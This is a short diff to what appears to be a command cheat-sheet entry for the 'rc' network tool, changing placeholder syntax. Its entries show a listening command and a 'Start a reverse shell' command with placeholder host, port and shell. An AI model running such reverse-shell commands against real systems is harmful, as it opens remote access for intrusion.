@@ -4,7 +4,7 @@
 % rc, common
 
 # Start listening on a specific port
-rc -lp {{port}}
+rc -lp <port>
 
 # Start a reverse shell
-rc {{host}} {{port}} -r {{shell}}
+rc <host> <port> -r <shell>
